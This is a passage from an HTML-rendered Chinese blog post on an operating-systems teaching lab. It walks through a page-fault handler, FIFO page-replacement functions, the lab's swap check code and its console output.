class="comment">//&#x82E5;&#x67E5;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x8BF4;&#x660E;&#x8BE5;&#x5730;&#x5740;&#x65E0;&#x6548;&#xFF0C;&#x4E0D;&#x5408;&#x6CD5;</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) {</span><br><span class="line">        cprintf(<span class="string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//&#x5224;&#x65AD;&#x5F02;&#x5E38;&#x7C7B;&#x578B;&#xFF0C;&#x4E0E;3&#xFF0C;&#x5373;&amp;11b&#xFF0C;&#x53D6;&#x540E;&#x4E24;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) {</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//&#x7F3A;&#x9875;&#xFF0C;&#x5B58;&#x5728;&#x5199;&#x5F02;&#x5E38;&#xFF0C;&#x4E0B;&#x9762;&#x5224;&#x65AD;&#x7269;&#x7406;&#x9875;&#x662F;&#x5426;&#x53EF;&#x5199;&#xFF0C;&#x82E5;&#x53EF;&#x5199;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x6D41;&#x7A0B;&#x5C06;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x6620;&#x5C04;&#xFF0C;&#x82E5;&#x4E0D;&#x53EF;&#x5199;&#xFF0C;&#x5219;&#x62A5;&#x9519;</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) {</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&apos;s vma cannot write\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//&#x5BF9;&#x5E94;&#x7269;&#x7406;&#x9875;&#x5B58;&#x5728;&#xFF0C;&#x4F46;&#x662F;&#x8BFB;&#x5F02;&#x5E38;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x6743;&#x9650;&#x95EE;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x62A5;&#x9519;</span></span><br><span class="line">        cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//&#x7F3A;&#x9875;&#xFF0C;&#x8BFB;&#x5F02;&#x5E38;&#xFF0C;&#x4E0B;&#x9762;&#x5224;&#x65AD;&#x7269;&#x7406;&#x9875;&#x662F;&#x5426;&#x53EF;&#x8BFB;&#xFF0C;&#x82E5;&#x53EF;&#x8BFB;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x6D41;&#x7A0B;&#x5C06;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x6620;&#x5C04;&#xFF0C;&#x82E5;&#x4E0D;&#x53EF;&#x5199;&#xFF0C;&#x5219;&#x62A5;&#x9519;</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) {</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&apos;s vma cannot read or exec\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/* &#x5269;&#x4E0B;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;</span></span><br><span class="line"><span class="comment">     * 1. &#x5199;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x53EF;&#x5199;&#x7269;&#x7406;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment">     * 2. &#x8BFB;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x53EF;&#x8BFB;&#x7269;&#x7406;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U;<span class="comment">//perm&#x4E3A;PDE&#xFF08;&#x9875;&#x76EE;&#x5F55;&#x9879;&#xFF09;/PTE&#xFF08;&#x9875;&#x9879;&#xFF09;&#x7684;&#x6743;&#x9650;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) {</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    }</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line"></span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>)) == <span class="literal">NULL</span>) {</span><br><span class="line">        cprintf(<span class="string">&quot;get_pte in do_pgfault failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x5982;&#x679C;&#x8BE5;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x4E3A;0&#xFF0C;&#x8BF4;&#x660E;&#x672A;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) { <span class="comment">// pgdir_alloc_page&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5E76;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) {</span><br><span class="line">            cprintf(<span class="string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> { <span class="comment">// &#x5426;&#x5219;&#x5C31;&#x662F;&#x6620;&#x5C04;&#x5230;swap&#x533A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x5230;&#x7269;&#x7406;&#x9875;</span></span><br><span class="line">           <span class="comment">// &#x8C03;&#x7528; page_insert &#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) {</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) {</span><br><span class="line">                cprintf(<span class="string">&quot;swap_in in do_pgfault failed\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            }    </span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">            page-&gt;pra_vaddr = addr;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">   }</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0B;&#x9762;&#x662F;&#x5B9E;&#x73B0;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x7684;_fifo_map_swappable&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;<span class="comment">//&#x83B7;&#x53D6;&#x961F;&#x5217;&#x7684;&#x8868;&#x5934;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<span class="comment">//&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x4F7F;&#x7528;&#x7684;&#x7EF4;&#x62A4;&#x7269;&#x7406;&#x9875;&#x7684;Page&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5730;&#x5740;</span></span><br><span class="line"> </span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">    list_add(head, entry);<span class="comment">//&#x6240;&#x4EE5;&#x5B9E;&#x73B0;&#x94FE;&#x63A5;&#x6548;&#x679C;&#xFF0C;&#x53EA;&#x8981;&#x6DFB;&#x52A0;&#x8FD9;&#x4E00;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x961F;&#x5217;&#xFF0C;&#x7528;&#x6765;&#x4FDD;&#x5B58;&#x7269;&#x7406;&#x9875;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x3002;&#x6BCF;&#x6B21;&#x4E0D;&#x8BBA;&#x91CD;&#x65B0;&#x5206;&#x914D;&#x7269;&#x7406;&#x9875;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;&#x8FD8;&#x662F;&#x5C06;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x88C5;&#x5165;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;&#x5373;&#x6BCF;&#x6B21;&#x7269;&#x7406;&#x9875;&#x88AB;&#x4F7F;&#x7528;&#xFF0C;&#x90FD;&#x4F1A;&#x66F4;&#x65B0;Page&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;pra_page_link&#x94FE;&#x8868;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x8868;&#x6309;&#x65F6;&#x95F4;&#x5148;&#x540E;&#x8FDE;&#x63A5;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x7528;&#x4EE5;FIFO&#x7684;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x65B0;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#x90FD;&#x4F1A;&#x94FE;&#x63A5;&#x5728;&#x94FE;&#x8868;&#x7684;&#x672B;&#x5C3E;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x662F;&#x5B9E;&#x73B0;&#x7684;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x7684;_fifo_swap_out_victim&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">{</span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;<span class="comment">//&#x83B7;&#x53D6;&#x961F;&#x5217;&#x7684;&#x8868;&#x5934;</span></span><br><span class="line">     assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = head-&gt;next;</span><br><span class="line">     assert(head!=le);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span><span class="comment">//&#x901A;&#x8FC7;Page&#x7684;&#x6210;&#x5458;pra_page_link&#x83B7;&#x53D6;Page&#x7684;&#x6307;&#x9488;</span></span><br><span class="line">     list_del(le);</span><br><span class="line">     assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">     *ptr_page = p;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0A;&#x9762;&#x7684;&#x961F;&#x5217;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5982;&#x679C;&#x7269;&#x7406;&#x5185;&#x5B58;&#x6EE1;&#x4E86;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5C06;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#x7F6E;&#x6362;&#x5230;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;_fifo_swap_out_victim&#x5C31;&#x662F;&#x5220;&#x9664;&#x961F;&#x5217;&#x4E2D;&#x5BF9;&#x9996;&#x7684;&#x6700;&#x65E9;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5E76;&#x7528;ptr_page&#x4FDD;&#x5B58;&#x3002;</p>
<h2 id="&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;"><a href="#&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;" class="headerlink" title="&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;"></a>&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;</h2><p>&#x5728;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x53EA;&#x63D0;&#x4F9B;&#x4E86;4&#x4E2A;&#x7269;&#x7406;&#x9875;&#x8FDB;&#x884C;&#x5206;&#x914D;&#xFF0C;&#x9996;&#x5148;&#x5EFA;&#x7ACB;&#x4E86;4&#x4E2A;&#x7269;&#x7406;&#x9875;&#x7684;&#x6620;&#x5C04;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap.c</span></span><br><span class="line"><span class="comment">//CHECK_VALID_PHY_PAGE_NUM = 4</span></span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;CHECK_VALID_PHY_PAGE_NUM;i++) {</span><br><span class="line">          check_rp[i] = alloc_page();</span><br><span class="line">          assert(check_rp[i] != <span class="literal">NULL</span> );</span><br><span class="line">          assert(!PageProperty(check_rp[i]));</span><br><span class="line">     }</span><br></pre></td></tr></table></figure>
<p>&#x7136;&#x540E;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5199;&#x5185;&#x5B58;&#x6570;&#x636E;&#x89E6;&#x53D1;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#xFF0C;&#x603B;&#x5171;&#x53D1;&#x751F;12&#x6B21;&#x5185;&#x5B58;&#x5199;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap_fifo.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_check_swap(<span class="keyword">void</span>) {</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page c in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;_</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page d in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page e in fifo_check_swap\n&quot;</span>);<span class="comment">//&#x9875;&#x9762;&#x7F6E;&#x6362;&#x5F00;&#x59CB;</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;<span class="comment">//&#x9875;&#x9762;&#x7F6E;&#x6362;&#x5F00;&#x59CB;</span></span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">6</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">7</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page c in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">8</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page d in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">9</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page e in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">10</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    assert(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> == <span class="number">0x0a</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0B;&#x9762;&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> up init env <span class="keyword">for</span> check_swap begin!</span><br><span class="line">page fault at 0x00001000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00002000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00003000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00004000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line"><span class="builtin-name">set</span> up init env <span class="keyword">for</span> check_swap over!</span><br><span class="line">write Virt<span class="built_in"> Page </span>c <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>d <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>e <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00005000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x1000 <span class="keyword">to</span> disk swap entry 2</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00001000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x2000 <span class="keyword">to</span> disk swap entry 3</span><br><span class="line">swap_in: load disk swap entry 2 with swap_page <span class="keyword">in</span> vadr 0x1000</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00002000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x3000 <span class="keyword">to</span> disk swap entry 4</span><br><span class="line">swap_in: load disk swap entry 3 with swap_page <span class="keyword">in</span> vadr 0x2000</span><br><span class="line">write Virt<span class="built_in"> Page </span>c <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00003000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x4000 <span class="keyword">to</span> disk swap entry 5</span><br><span class="line">swap_in: load disk swap entry 4 with swap_page <span class="keyword">in</span> vadr 0x3000</span><br><span class="line">write Virt<span class="built_in"> Page </span>d <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00004000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x5000 <span class="keyword">to</span> disk swap entry 6</span><br><span class="line">swap_in: load disk swap entry 5 with swap_page <span class="keyword">in</span> vadr 0x4000</span><br><span class="line">write Virt<span class="built_in"> Page </span>e <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00005000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x1000 <span class="keyword">to</span> disk swap entry 2</span><br><span class="line">swap_in: load disk swap entry 6 with swap_page <span class="keyword">in</span> vadr 0x5000</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00001000: K/R [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x2000 <span class="keyword">to</span> disk swap entry 3</span><br><span class="line">swap_in: load disk swap entry 2 with swap_page <span class="keyword">in</span> vadr 0x1000</span><br><span class="line">count is 0, total is 7</span><br></pre></td></tr></table></figure>
<p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x7A0B;&#x5E8F;&#x8981;&#x5BF9;0x00005000&#x8FDB;&#x884C;&#x5199;&#x65F6;&#x51FA;&#x73B0;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#xFF0C;&#x4F46;&#x662F;&#x7269;&#x7406;&#x9875;&#x5DF2;&#x7ECF;&#x6EE1;&#x4E86;&#xFF0C;&#x5C31;&#x628A;0x00001000&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406;&#x9875;&#x7F6E;&#x6362;&#x5230;swap&#x533A;&#x2026;&#x2026;</p>
<p>&#x6700;&#x540E;12&#x6B21;&#x5199;&#x4E2D;&#xFF0C;&#x53D1;&#x751F;&#x4E86;7&#x6B21;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x3002;</p>
